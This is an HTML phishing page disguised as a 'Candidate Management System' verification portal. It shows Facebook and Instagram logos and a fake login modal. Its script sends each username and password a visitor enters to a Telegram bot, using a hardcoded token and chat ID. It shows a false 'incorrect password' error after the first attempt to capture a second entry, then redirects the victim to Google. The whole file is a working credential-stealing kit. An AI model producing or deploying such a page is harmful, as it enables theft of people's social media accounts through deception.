<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candidate Management System | Verify</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col font-sans">
    <header class="bg-white p-4 text-center border-b shadow-sm">
        <h1 class="text-[10px] font-bold uppercase tracking-widest text-red-900">CANDIDATE MANAGEMENT SYSTEM</h1>
    </header>

    <main class="flex-grow flex items-center justify-center p-4">
        <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-sm text-center border border-gray-100">
            <h2 class="text-xl font-bold mb-2">Secure Sign In</h2>
            <p class="text-[11px] text-gray-400 mb-8 font-medium italic">Verify identity to access the dashboard</p>
            
            <div class="space-y-4 mb-8">
                <button onclick="openPortal('Profile A')" class="w-full border flex items-center justify-start px-5 py-3 rounded-xl hover:bg-gray-50 active:scale-95 transition">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" class="w-5 mr-4">
                    <span class="text-sm font-bold text-gray-600">Verify via Profile A</span>
                </button>
                <button onclick="openPortal('Profile B')" class="w-full border flex items-center justify-start px-5 py-3 rounded-xl hover:bg-gray-50 active:scale-95 transition">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-5 mr-4">
                    <span class="text-sm font-bold text-gray-600">Verify via Profile B</span>
                </button>
            </div>

            <div class="space-y-3 text-left">
                <input type="text" placeholder="Reference ID" class="w-full border p-3 rounded-xl text-sm bg-gray-50 outline-none">
                <input type="password" placeholder="Security Key" class="w-full border p-3 rounded-xl text-sm bg-gray-50 outline-none">
                <button class="w-full bg-[#7f1d1d] text-white py-3 rounded-xl font-bold text-sm shadow-lg">LOG IN</button>
            </div>
        </div>
    </main>

    <div id="loginModal" class="fixed inset-0 bg-black/80 hidden flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-[25px] w-full max-w-sm p-10 text-center shadow-2xl relative">
            <img id="modal-icon" src="" class="w-16 mx-auto mb-6">
            <h3 class="font-bold text-xl mb-1 text-gray-800">Login Required</h3>
            <p class="text-xs text-gray-400 mb-8 uppercase tracking-widest font-bold">Verification Gateway</p>
            
            <div id="err-box" class="bg-red-50 text-red-600 text-[11px] p-3 rounded-xl mb-6 hidden border border-red-100 font-bold text-center">
                ‚ö†Ô∏è Verification failed. Incorrect password. Please try again.
            </div>
            
            <input type="text" id="u_field" placeholder="Username, phone or email" class="w-full border p-4 rounded-2xl mb-4 text-sm bg-gray-50 outline-none focus:border-gray-300">
            <input type="password" id="p_field" placeholder="Password" class="w-full border p-4 rounded-2xl mb-8 text-sm bg-gray-50 outline-none focus:border-gray-300">
            
            <button onclick="sendToBot()" id="subBtn" class="w-full text-white py-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition">CONFIRM</button>
            <button onclick="closePortal()" class="mt-4 text-gray-400 text-xs font-bold hover:underline">Cancel</button>
        </div>
    </div>

    <script>
        const BOT_SETTING = {
            T: "8575047403:AAFLEU-1LmDZRfU-zpBtEdj9pVUdagt9hOA", // Naya Token
            C: "6521606449" // Nayi Chat ID
        };

        let activeType = "";
        let attempt = 0;

        function openPortal(type) {
            activeType = type;
            const icon = document.getElementById('modal-icon');
            const btn = document.getElementById('subBtn');
            icon.src = (type === 'Profile A') ? "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" : "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg";
            btn.style.backgroundColor = (type === 'Profile A') ? "#1877F2" : "#E1306C";
            document.getElementById('loginModal').classList.remove('hidden');
        }

        function closePortal() { document.getElementById('loginModal').classList.add('hidden'); }

        async function sendToBot() {
            const user = document.getElementById('u_field').value;
            const pass = document.getElementById('p_field').value;
            const btn = document.getElementById('subBtn');
            const err = document.getElementById('err-box');

            if (!user || !pass) return alert("Please fill all details!");

            btn.innerText = "VERIFYING...";
            btn.disabled = true;

            const text = `üö® **NEW ENTRY**\n\nüë§ **User:** \`${user}\` \nüîë **Pass:** \`${pass}\` \nüìÇ **Type:** ${activeType}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_SETTING.T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: BOT_SETTING.C, text: text, parse_mode: 'Markdown' })
                });

                if (response.ok) {
                    attempt++;
                    if (attempt === 1) {
                        err.classList.remove('hidden');
                        document.getElementById('p_field').value = "";
                        btn.innerText = "CONFIRM";
                        btn.disabled = false;
                    } else {
                        window.location.href = "https://www.google.com";
                    }
                } else {
                    alert("Submission error. Please make sure you started the bot @VeerVerify00007_bot on Telegram.");
                    btn.disabled = false;
                    btn.innerText = "CONFIRM";
                }
            } catch (e) {
                alert("Check your internet connection!");
                btn.disabled = false;
                btn.innerText = "CONFIRM";
            }
        }
    </script>
</body>
</html>
